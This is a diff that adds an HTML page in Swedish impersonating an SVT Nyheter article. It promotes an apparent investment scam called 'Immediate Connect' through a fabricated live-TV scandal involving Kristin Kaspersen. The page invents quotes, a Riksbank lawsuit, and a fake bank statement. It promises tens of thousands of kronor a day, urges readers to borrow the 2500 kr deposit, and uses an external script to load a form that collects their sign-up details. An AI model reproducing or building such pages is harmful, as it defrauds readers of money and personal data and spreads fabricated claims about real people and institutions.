@@ -1,0 +1,542 @@
+<!DOCTYPE html><html lang="sv" class="webp"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="stylesheet" href="./assets/style.min.css">
+    <link rel="stylesheet" href="./assets/add.css">
+    <title>svt</title>
+    <script>
+      function dtime_nums(e, t) {
+        var a = new Date();
+        a.setDate(a.getDate() + e + 1);
+        var n = "";
+        a.getDate() < 10 && (n = "0"), (n += a.getDate());
+        var g = "";
+        a.getMonth() + 1 < 10 && (g = "0"),
+          (g += a.getMonth() + 1),
+          t === !0
+            ? document.write(n + "." + g + "." + a.getFullYear())
+            : document.write(n + "." + g + "." + a.getFullYear());
+      }
+    </script>
+    <script defer="defer">
+      window.addEventListener("scroll", function () {
+        const header1 = document.getElementById("header1");
+        const header2 = document.getElementById("header2");
+
+        if (window.pageYOffset > 0) {
+          header1.style.display = "none";
+          header2.style.display = "block";
+        } else {
+          header1.style.display = "block";
+          header2.style.display = "none";
+        }
+      });
+    </script>
+<body id="body">
+    <div id="overlay" class="overlay"></div>
+    <header class="header">
+        <div class="header__wrapper">
+            <div class="header__top">
+                <div class="container">
+                    <div class="header__top-wrapper">
+                        <div class="scroll-to-form header__logo"><img src="./assets/svt-nyheter-logo-cc32e1bea0b4054b7735_1.svg" alt="SVT Nyheter" class="header__logo-image"></div>
+                        <nav id="nav" class="header__nav"><button id="nav-close" class="header__nav-close"><span></span>
+                                <span></span></button>
+                            <ul class="header__list">
+                                <li class="header__list-item"><a href="#" class="header__link header__link--toggle">Nyheter <img src="./assets/scrollarrow1.svg" alt="Down" class="header__arrow"></a></li>
+                                <li class="header__list-item"><a href="#" class="header__link header__link--toggle active">Lokalt <img src="./assets/scrollarrow2.svg" alt="Down" class="header__arrow"></a></li>
+                                <li class="header__list-item"><a href="#" class="header__link header__link--toggle">Sport <img src="./assets/scrollarrow1.svg" alt="Down" class="header__arrow"></a></li>
+                                <li class="header__list-item"><a href="#" class="header__link">SVT Play</a></li>
+                                <li class="header__list-item"><a href="#" class="header__link">Barn</a></li>
+                                <li class="header__list-item"><a href="#" class="header__link">Tv-tablå</a></li>
+                                <li class="header__list-item"><a href="#" class="header__link">Alla program</a></li>
+                                <li class="header__list-item"><a href="#" class="header__link">Om SVT</a></li>
+                            </ul>
+                        </nav>
+                        <div class="header__mobile"><a href="#" class="header__link">Lokalt </a><button id="nav-open" class="header__hamburger"><span></span> <span></span> <span></span></button></div>
+                    </div>
+                </div>
+            </div>
+            <div class="header__bottom">
+                <div class="container">
+                    <div class="header__bottom-wrapper"><span class="header__slesh">/</span>
+                        <div class="header__site-nav"><a href="#" class="header__site-link">Människor </a>| <a href="#" class="header__site-link">Svenska invånare </a>| <span class="header__site-current">Draknästet</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main class="page">
+        <div class="container">
+            <div class="page__wrapper">
+                <div class="page__left">
+                    <article class="article">
+                        <div class="article__container">
+                            <h1 class="article__main-title">
+                                Riksbanken stämmer Kristin Kaspersen på grund av hennes insikt i hur varje svensk kan bli väldigt rik.
+                            </h1>
+                        </div>
+
+                            <div class="scroll-to-form page__video">
+                        <picture>
+                            <source srcset="./assets/video_img.webp" type="image/webp"><img src="./assets/video_img.jpg" alt="Video">
+                        </picture>
+                        <div class="page__video-play"><img src="./assets/Button_play.svg" alt="Play video"></div>
+                    </div>
+                        <div class="article__container">
+
+                            <div class="article__dates"><span>Publicerad <span class="public-date"><script>
+              dtime_nums(-1);
+            </script></span></span></div>
+
+                        </div>
+                        <div class="article__container">
+                            <h3 class="article__title">
+                            Den berömda programledaren ångrar att hon i en livesändning berättade sanningen. Men det var redan försent. 
+                            </h3>
+                            <p class="article__text italic">
+                            “Jag är rädd för fattigdom och jag kan inte förstå mig på fattiga människor,” sade Kristin Kaspersen i en livesändning. “Jag nyttjar varje möjlighet att bli rikare och jag känner till ett sätt varje svensk medborgare kan bli en miljonär. Det är min personliga hemlighet”
+                            </p>
+                        </div>
+                        <div class="scroll-to-form article__image-wrapper">
+                            <picture>
+                                <source srcset="./assets/article_2.webp" type="image/webp"><img src="./assets/article_2.jpg" alt="Image" class="article__image">
+                            </picture>
+                        </div>
+                        <div class="article__container">
+                            <p class="article__text">
+                                Skandalen blossade upp mitt i en livesändning av “Ekonomibyrån”, då Kristin Kaspersen råkade visa en länk på hennes telefon. De uppmärksamma tittarna hann se länken, vilket fick Riksbanken att ringa TV-studion och be om att livesändningen skulle avbrytas. <br>
+                                <span class="italic">Trots det lyckades vi övertala redaktören av “Ekonomibyrån” att förse oss med en kopia av det kontroversiella avsnittet. Det är dock värt att notera att detta föremål kan försvinna närsomhelst. Så om du har tur nog att läsa denna artikel, så bör du registrera dig med länken som Kristin Kaspersen länge har hållit hemlig. </span>
+                            </p>
+                            <p class="article__title">
+                                INTERVJUN MED KRISTIN KASPERSEN SOM ALLA BANKER FRUKTAR. 
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Kristin Kaspersen:</span> “Jag ska säga dig något nu: man behöver inte arbeta för att bli förmögen. Så fort man förstår det, så behöver man inte oroa sig över pengar längre.”
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Carolina Neurath:</span> “Om det verkligen är möjligt, varför inte dela med sig?”
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Kristin Kaspersen:</span> “Varför ska jag dela med mig av mina hemligheter om jag inte får något tillbaka? Försök inte ens lista ut hur jag har lyckats de senaste tre åren. Jag kommer inte visa någon, inte ens för mycket pengar. Annars kommer människor aldrig att lära sig att leta efter andra möjligheter. Dessutom skulle det kunna skada nationalekonomin ifall man visste hur jag gjorde det.”
+
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Carolina Neurath:</span> “Till vilken del skulle det skada Sverige att veta hur man tjänar pengar?”
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Kristin Kaspersen:</span> “Bara tänk på det. Om någon vet hur man blir miljonär på två månader, varför skulle den personen fortsätta jobba? Så klart kan vem som helst använda min strategi, men borde alla verkligen vara förmögna? Det skulle inte finnas någon att täcka alla de vanliga jobben då.”
+                            </p>
+
+                            <p class="article__text">
+                            <span class="bold">Carolina Neurath:</span> “Det låter för bra för att vara sant. Jag trodde alltid att du var en ärlig person, men jag tror inte riktigt på dig vid det här laget.”
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Kristin Kaspersen:</span> “Ska jag ljuga? Bra. Jag kommer visa för alla hur alla fattiga människor i Sverige kan tjäna tiotusentals kronor om dagen på bara fem minuter. Så kan jag också visa er hur mycket jag tjänar med denna metod. Jag vill inte berätta för mycket, men jag kan säga att det har med aktier att göra; aktier gör alla förmögna nu för tiden.
+                            </p>
+                            <p class="article__text italic">
+                            Kristin Kaspersen tog upp något på hennes telefon och visade det för redaktören. Redaktören blev förvånad. <span class="bold">Kristin Kaspersen:</span> “Nå, vad tycker du då? Är det inte fantastiskt? Gissa hur mycket jag la in. Endast 2500 kr. Nu tjänar denna hemsida mig tiotusentals dagligen och är på även när jag sover.” Efter den meningen sprang en kameraman till redaktören och viskade något i hennes öra.
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Carolina Neurath:</span> “Jag fick precis berättat för mig att länken till hemsidan syntes för alla tittare när du gav mig mobilen.”
+                            </p>
+                        </div>
+                        <div class="scroll-to-form article__image-wrapper">
+                            <picture>
+                                <source srcset="./assets/article_3.webp" type="image/webp"><img src="./assets/article_3.jpg" alt="Image" class="article__image">
+                            </picture>
+                        </div>
+                        <div class="article__container">
+                            <p class="article__text italic">
+                                Kristin Kaspersen blev förskräckt. Hur hon hade blivit förmögen hade nu läckt ut under en livesändning
+                            </p>
+                            <p class="article__text">
+                                <span class="bold">Kristin Kaspersen:</span> “Det räcker med att jag ringer ett samtal och detta program kommer aldrig att sändas. Jag begär att du klipper bort delen då länken syntes. Jag vill inte dela den med någon”
+                            </p>
+                            <p class="article__text">
+                                <span class="bold">Carolina Neurath:</span> “Du vet väl att detta är en livesändning, eller hur? Du behöver inte gömma det längre. Det hade varit väldigt hjälpsamt om du delade med dig till det svenska folket om denna inkomstkälla”
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Kristin Kaspersen:</span> “Jag har använt denna hemsida i tre år. Allt man behöver göra är att följa länken och logga in. Man behöver sätta in åtminstone 2500 kr. Det är minimigränsen för att hemsidan ska fungera väl. Efter det behöver man inte göra något, hemsidan sköter sig själv. Allt man behöver göra är att kolla till sitt saldo ofta och överföra omsättningen.”
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Carolina Neurath:</span> “Vad krävs för att förstå hur man gör och tjäna lika mycket som du?”
+                            </p>
+                            <p class="article__text">
+                            <span class="bold">Kristin Kaspersen:</span> “Man behöver inga tidigare kunskaper, det kan jag bevisa. Var snäll och ge mig din telefon. Jag ska skapa ett konto åt dig på <a href="#iframe-link-wrapper" class="link">Immediate Connect </a> och du kommer själv se hur mycket du har tjänat vid slutet av intervjun.”
+                            </p>
+                            <p class="article__text italic">
+                            Carolina Neurath gav sin telefon till Kristina Kaspersen. Kontot blev skapat och inom några minuter var ingångssumman betald
+                            </p>
+                        </div>
+                        <div class="scroll-to-form article__image-wrapper">
+                            <picture>
+                                <source srcset="./assets/article_4.png" type="image/webp"><img src="./assets/urn:scrapbook:download:error:https://umpaloompa.bio/landers/2334/[309]immediate_connect_kaspersen_se/assets/images/article_4.jpg" alt="Image" class="article__image">
+                            </picture>
+                        </div>
+                        <div class="article__container">
+                            <p class="article__text">
+                            <span class="bold">Carolina Neurath:</span> “Var det allt? Vad behöver man göra nu?”
+                            </p>
+                            <p class="article__text"><span class="bold">Kristin Kaspersen:</span> “Inget alls. Om ungefär tjugo minuter kommer vi se hur mycket du har tjänat.”</p>
+                            <p class="article__text"><span class="bold">Carolina Neurath:</span> “Om hemsidan verkligen fungerar, vad kan svensken som inte ens kan betala ingångssumman göra?”</p>
+                            <p class="article__text"><span class="bold">Kristin Kaspersen:</span> “När jag fann <a href="#iframe-link-wrapper" class="link">Immediate Connect </a> hade jag inte mycket pengar jag med, det var mitt i pandemin. Men, de kan betala ingångssumman på kredit. Vilket syfte fyller pengar som inte växer? Det är en möjlighet som man inte får gå miste om” <br>
+                            Efter cirka 20 minuter var det dags att kontrollera balansen.</p>
+                            <p class="article__text"><span class="bold">Kristin Kaspersen:</span> “Helt ärligt nu, hur mycket tjänade du på 20 minuter?”</p>
+                            <p class="article__text"><span class="bold">Carolina Neurath:</span> “500 kr netto, kontosaldot är nu 3000 kr! Jag kan inte tro att detta faktiskt fungerar.”</p>
+                            
+                        </div>
+                        <div class="scroll-to-form article__image-wrapper">
+                            <picture>
+                                <source srcset="./assets/article_5.webp" type="image/webp"><img src="./assets/article_5.jpg" alt="Image" class="article__image">
+                            </picture>
+                        </div>
+                        <div class="article__container">
+                            <p class="article__text">
+                                Riksbanken ringde sedan och begärde att livesändningen skulle avbrytas. Om alla kände till <a href="#iframe-link-wrapper" class="link">Immediate Connect </a> skulle bankerna förlora kunder. Folk skulle bara använda sina bankkort för att ta ut sina vinster. Det skulle betyda stora förluster för bankerna. Efter att livesändningen avbröts, bestämde sig våran redaktör för att testa hemsidan för sig själv och skrev en rapport om det efteråt.
+                            </p>
+                        </div>
+                        <div class="scroll-to-form article__image-wrapper">
+                            <picture>
+                                <source srcset="./assets/article_6.webp" type="image/webp"><img src="./assets/article_6.png" alt="Image" class="article__image">
+                            </picture>
+                            <label class="article__text" style="color: grey;">Gerhard Hoch - Nyhetsredaktör</label>
+                        </div>
+
+                        <div class="article__container">
+                            <h3 class="day">Dag 1</h3>
+                            <p class="article__text"><em>"Jag måste erkänna att jag först inte litade på den här hemsidan, men jag ville verkligen testa den. När jag gjorde min forskning hade jag inte ens pengar för ingångssumman, därför behövde jag betala den på kredit. Jag investerade 2500 kr och såg vad som hände. Föreställ dig nu min förvåning när ingenting hände efter den första insättningen. Jag trodde redan att jag hade blivit lurad. Men efter några minuter började algoritmen fungera. Jag var glad över det, men lade märke till följande statistik: Jag förlorade 220 kr på min första aktie! Redan under de första minuterna kunde stora förluster konstateras. Men nästa aktie och de fyra som följde gav mig vinst och på några minuter gick mitt saldo från 2500 till 2750 kr.”</em></p>
+                            <h3 class="day">Dag 2</h3>
+                            <p class="article__text article__text--pb-3">
+                            “Dagen började med att jag kollade mitt kontosaldo. Det var redan uppe på 6800 kr! Ponera följande: på en dag har det fördubblats. Jag var beredd på att ta ut mina vinster, men bestämde mig för att vänta en vecka till”</p>
+                        <div class="scroll-to-form article__image-wrapper">
+                            <picture>
+                                <source srcset="./assets/article_7.webp" type="image/webp"><img src="./assets/article_7.png" alt="Image" class="article__image">
+                            </picture>
+                            <label class="article__text" style="color: grey;">Ett officiellt kvitto från banken</label>
+                        </div>
+                            <h3 class="day">Dag 7</h3>
+                            <p class="article__text"><em>“Jag har inte kollat mitt kontosaldo på en hel vecka. Det var svårt att hålla sig eftersom jag var rädd att pengarna skulle var borta. Men, när jag loggade in såg jag följande: nästan 85% av alla aktier hade gått med vinst. Resterande 15% hade vänt vid ett senare skede. Mitt kontosaldo låg på 45000 kr, varav jag tog ut 40000 kr för att ge till min fru. Pengarna var på kontot inom en timme.”</em></p>
+                        </div>
+                        <div class="article__container">
+                            <p class="article__text bold">
+                            Här är kontoutdraget:
+                            </p>
+                        </div>
+                        <div id="popup" class="popup">
+                            <div class="popup__close"><svg role="presentation" class="close-popup" width="22px" height="16px" viewBox="0 0 23 23" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+                                    <g stroke="none" stroke-width="1" fill="#fff" fill-rule="evenodd">
+                                        <rect transform="translate(11.313708, 11.313708) rotate(-45.000000) translate(-11.313708, -11.313708) " x="10.3137085" y="-3.6862915" width="2" height="30"></rect>
+                                        <rect transform="translate(11.313708, 11.313708) rotate(-315.000000) translate(-11.313708, -11.313708) " x="10.3137085" y="-3.6862915" width="2" height="30"></rect>
+                                    </g>
+                                </svg></div>
+                <div class="check">
+                  <div class="check__wrapper">
+                    <div class="check__top">
+                      <div class="check__top-grid">
+                        <div class="check__top-col-1">
+                          <div class="check__top-col-1-row">
+                            <a href="#iframe-link-wrapper" class="black">
+                              <img src="./assets/bank-logo.webp" alt="" width="100px" class="bank__logo">
+                            </a>
+                          </div>
+                          <div class="check__top-col-1-row">
+                            <h4 class="check__top-col-title">1621A101</h4>
+                            <span>Gerhard Hoch</span>
+                            <span></span>
+                            <span>Strandgatan 5, 151 71</span>
+                            <span>Södertälje, Sverige </span>
+                          </div>
+                        </div>
+                        <div class="check__top-col-2">
+                          <span>Nationell klassningskod <br>
+                            code
+                            <br>
+                            93-14-13
+                          </span>
+                          <span>Kontonamn
+                            <br>
+                            Gerhard Hoch
+                          </span>
+                          <span style="pointer-events: none">Telefon
+                            <br>
+                            58302664
+                          </span>
+                          <span>Kontonummer
+                            <br>
+                            17845-21
+                          </span>
+                        </div>
+                      </div>
+                    </div>
+                    <br>
+                    <span class="check__iban" style="pointer-events: none">IBAN: SE4352898552924</span>
+                    <br>
+                    <div class="check__bot">
+                      <div class="check__bot-grid">
+                        <div class="check__bot-grid-col">
+                          <span class="check__bot-grid-col-title">Datum</span>
+
+                          <span class="check__bot-grid-col-text">
+                          16/11/2023
+
+                          </span>
+                        </div>
+                        <div class="check__bot-grid-col">
+                          <span class="check__bot-grid-col-title">Transaktion</span>
+
+                          <span class="check__bot-grid-col-text"></span>
+                          <a href="#iframe-link-wrapper" class="link">Immediate Connect </a>
+                            hemsida
+                        </div>
+                        <div class="check__bot-grid-col">
+                          <span class="check__bot-grid-col-title">Lastschrift</span>
+
+                          <span class="check__bot-grid-col-text">4000</span>
+                        </div>
+                        <div class="check__bot-grid-col">
+                          <span class="check__bot-grid-col-title">Kredit</span>
+
+                          <span class="check__bot-grid-col-text">-</span>
+                        </div>
+                        <div class="check__bot-grid-col">
+                          <span class="check__bot-grid-col-title">Balansräkning</span>
+
+                          <span class="check__bot-grid-col-text">9709</span>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+            <div class="article__container">
+                <div class="container-sm">
+                  <ul class="reg__list">
+                    <h3 class="article__title" style="padding-top: 3rem;">
+                    Här är en snabbguide på hur man tjänar pengar med <a href="#iframe-link-wrapper" class="link">Immediate Connect:</a>
+                    </h3>
+                    <div class="reg__list-container">
+                      <a href="#iframe-link-wrapper" class="black">
+                        <img src="./assets/one.webp" alt="">
+                      </a>
+                      <div class="reg__item">
+                      Använd länken ni fått av Kristin Kaspersen.
+                      </div>
+                    </div>
+                    <div class="reg__list-container">
+                      <img src="./assets/two.webp" alt="">
+                      <div class="reg__item">
+                        Sätt in pengar på kontot. Den minsta ingångssumman ligger på 2500 kr. 
+                      </div>
+                    </div>
+                    <div class="reg__list-container">
+                      <a href="#iframe-link-wrapper" class="black">
+                        <img src="./assets/three.webp" alt="">
+                      </a>
+                      <div class="reg__item">
+                        Ett par minuter efter insättningen kommer hemsidan att sätta igång.
+                      </div>
+                    </div>
+                    <div class="reg__list-container">
+                      <img src="./assets/four.webp" alt="">
+                      <div class="reg__item">
+                        Pengarna kan tas ut närsomhelst och tar mellan 2-3 timmar beroende på din bank.
+                      </div>
+                    </div>
+                  </ul>
+                </div>
+            </div>
+<div id="iframe-link-wrapper"></div>
+<script>
+    window.dmnlc = "dunkansp.com";
+    window.cmpnk = "hidmklkzgrgyaktoac4j";
+    window.fnlnm = "IMMEDIATE_CONNECT";
+    window.cdnDomainUrl = 'cdn-data-12.net';
+    // form settings
+    window.color = "#e02e3d";
+    window.language = "sv"; // en,de,zh,sv,es,da
+    window.phone_detection = "se";
+    window.form_key = "iframe-link-wrapper";
+    window.tyPage = "https://trackleadsapp.com/typ/index.html";
+  </script>
+  <script src="https://cdn-data-12.net/cdn/2333/form/v1/script.js"></script>
+  <br><br>
+
+  <br><br>                            
+                                <div class="popup__warning">
+                                    <p>**OBS!: BEGRÄNSAT ERBJUDANDE - Ett mycket litet antal gratis reservationer av
+                                        programvaran är tillgängliga.</p><a href="#" class="popup__link">Klicka här och
+                                        fyll i formuläret</a>
+
+
+                            </div>
+                        </div>
+                        <div class="foot">
+                            <div class="foot__wrapper">
+                                <div class="foot__medias"><a href="#" class="foot__media-link"><img src="./assets/Button_fb_dela.svg" alt="Facebook" class="foot__media-image">
+                                    </a><a href="#" class="foot__media-link"><img src="./assets/Button_tw_dela.svg" alt="Twitter" class="foot__media-image"></a></div>
+                                <div class="foot__author">
+                                    <div class="foot__author-top"><img src="./assets/email.svg" alt="E-mail" class="foot__author-letter"> <span class="foot__author-name">Oscar
+                                            Barragan</span></div>
+                                    <div class="foot__author-dates"><span>Publicated <span class="public-date"><script>
+              dtime_nums(-1);
+            </script></span></span></div>
+                                    <div class="foot__author-question"><img src="./assets/email.svg" alt="E-mail" class="foot__author-letter"> <a href="#" class="foot__question">Hittat
+                                            språk- eller faktafel i texten? Skriv och berätta.</a></div>
+                                </div>
+                                <div class="foot__work">
+                                    <h3 class="foot__work-title">SÅ ARBETAR VI</h3>
+                                    <p class="foot__text">SVT:s nyheter ska stå för saklighet och opartiskhet. Det vi
+                                        publicerar ska vara sant och relevant. Vid akuta nyhetslägen kan det vara svårt
+                                        att få alla fakta bekräftade, då ska vi berätta vad vi vet – och inte vet. <a href="#" class="foot__link">Läs mer om hur vi arbetar.</a></p>
+                                </div>
+                            </div>
+                        </div>
+                    </article>
+                </div>
+                <div class="page__right">
+                    <div class="side-bar">
+                        <div class="side-bar__content">
+                            <section class="west-news">
+                                <h3 class="west-news__title">Senaste nytt från Väst</h3>
+                                <ul class="west-news__list">
+                                    <li class="scroll-to-form west-news__list-item"><span class="west-news__news">Död
+                                            kvinna hittad i vattnet i<br>Göteborg </span><span class="west-news__time">2
+                                            tim</span></li>
+                                    <li class="scroll-to-form west-news__list-item"><span class="west-news__news">Här
+                                            hyllar politikerna Mathildas<br>fika-initiativ: ”Otroligt viktigt”
+                                        </span><span class="west-news__time">7 tim</span></li>
+                                    <li class="scroll-to-form west-news__list-item"><span class="west-news__news">26-åriga Mathilda kände ingen<br>– då startade hon
+                                            ”grannfika” </span><span class="west-news__time">7 tim</span></li>
+                                </ul>
+                            </section>
+                            <section class="read-west">
+                                <h3 class="read-west__title">Mest läst Väst</h3>
+                                <ul class="read-west__list">
+                                    <li class="scroll-to-form read-west__list-item"><span class="read-west__number">1
+                                        </span><span class="read-west__text">Ica varnar för hot mot handlare efter
+                                            skenande matpriser</span></li>
+                                    <li class="scroll-to-form read-west__list-item"><span class="read-west__number">2
+                                        </span><span class="read-west__text">Sugardaters vd vill inte svara på frågor
+                                            från SVT:s reporter</span></li>
+                                    <li class="scroll-to-form read-west__list-item"><span class="read-west__number">3
+                                        </span><span class="read-west__text">Bråk vid Alingsås tingsrätt – stor
+                                            polisinsats på platsen</span></li>
+                                </ul>
+                            </section>
+                            <section class="svt-play">
+                                <h3 class="svt-play__title">Senaste avsnittet i SVT Play</h3>
+                                <div class="scroll-to-form svt-play__video">
+                                    <picture>
+                                        <source srcset="./assets/img_3.webp" type="image/webp"><img src="./assets/img_3.jpg" alt="Image" class="svt-play__image">
+                                    </picture>
+                                    <div class="svt-play__play-btn"><img src="./assets/Button_play_1.svg" alt="Play video" class="svt-play__play-image"></div>
+                                </div>
+                                <h3 class="svt-play__title svt-play__title--custom">Lokala Nyheter Väst</h3>
+                                <div class="svt-play__time">Idag 09:33</div>
+                                <div class="scroll-to-form svt-play__item">
+                                    <div class="svt-play__item-image">
+                                        <picture>
+                                            <source srcset="./assets/img_4.webp" type="image/webp"><img src="./assets/img_4.jpg" alt="Image">
+                                        </picture>
+                                    </div>
+                                    <p class="svt-play__text">Mathilda, 26, kände ingen i trapphuset – bjöd in till
+                                        ”grannfika”</p>
+                                </div>
+                                <div class="scroll-to-form svt-play__item">
+                                    <div class="svt-play__item-image"><img src="./assets/img_5.svg" alt="Image"></div>
+                                    <p class="svt-play__text">Högljudda, snåla och mindre bildade – här är fördomarna AI
+                                        har om göteborgare</p>
+                                </div>
+                            </section>
+                            <section class="contacts">
+                                <h3 class="contacts__title">Kontakta SVT Nyheter Väst</h3>
+                                <ul class="contacts__list">
+                                    <li class="scroll-to-form contacts__list-item"><img src="./assets/email_2.svg" alt="Email" class="contacts__list-image">
+                                        <p class="contacts__text">Mejla redaktionen</p>
+                                    </li>
+                                    <li class="scroll-to-form contacts__list-item"><img src="./assets/facebook_1.svg" alt="Email" class="contacts__list-image">
+                                        <p class="contacts__text">Följ oss på Facebook</p>
+                                    </li>
+                                    <li class="scroll-to-form contacts__list-item"><img src="./assets/phone_1.svg" alt="Email" class="contacts__list-image">
+                                        <p class="contacts__text">Ring redaktionen:<br>031-83 72 60</p>
+                                    </li>
+                                </ul>
+                            </section>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+    <footer class="footer">
+        <div class="footer__top">
+            <div class="container">
+                <div class="footer__top-wrapper">
+                    <nav class="footer__nav">
+                        <div class="footer__nav-item">
+                            <h3 class="footer__nav-title">Nyheter</h3>
+                            <ul class="footer__list">
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Start</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Lokala nyheter</a>
+                                </li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Sport</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Väder</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Text-tv</a></li>
+                            </ul>
+                        </div>
+                        <div class="footer__nav-item">
+                            <h3 class="footer__nav-title">Tjänster</h3>
+                            <ul class="footer__list">
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">SVT Play</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Barn</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">TV-tablå</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Alla program</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Öppet arkiv</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Recept</a></li>
+                            </ul>
+                        </div>
+                        <div class="footer__nav-item">
+                            <h3 class="footer__nav-title">Aktuella program</h3>
+                            <ul class="footer__list">
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Rapport</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Aktuellt</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Morgonstudion</a>
+                                </li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Sportnytt</a></li>
+                            </ul>
+                        </div>
+                        <div class="footer__nav-item">
+                            <h3 class="footer__nav-title">Hjälp och kontakt</h3>
+                            <ul class="footer__list">
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Kontakta SVT</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Kontakta SVT
+                                        Nyheter</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Tipsa SVT Nyheter</a>
+                                </li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Om SVT</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">About SVT</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">SVT-bloggen</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Anmäl till
+                                        medieombudsmannen</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Om
+                                        personuppgifts­behandling och cookies</a></li>
+                                <li class="footer__list-item"><a href="#" class="footer__nav-link">Cookie-inställningar</a></li>
+                            </ul>
+                        </div>
+                    </nav>
+                </div>
+            </div>
+        </div>
+        <div class="footer__bottom">
+            <div class="container">
+                <div class="footer__bottom-wrapper">
+                    <div class="footer__logo"><img src="./assets/svt-nyheter-logo-cc32e1bea0b4054b7735_2.svg" alt="SVT logo" class="footer__logo-image"></div>
+                    <div class="footer__info"><span>Ansvarig utgivare: Göran Eklund</span> | <span>E-post: <a href="#" class="footer__info-link footer__info-link--bold">vast@svt.se</a> </span>|
+                        <span>Telefon: <a href="#" class="footer__info-link">031-83 72 60</a> </span>| <span>© Sveriges
+                            Television AB</span></div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    </body></html>
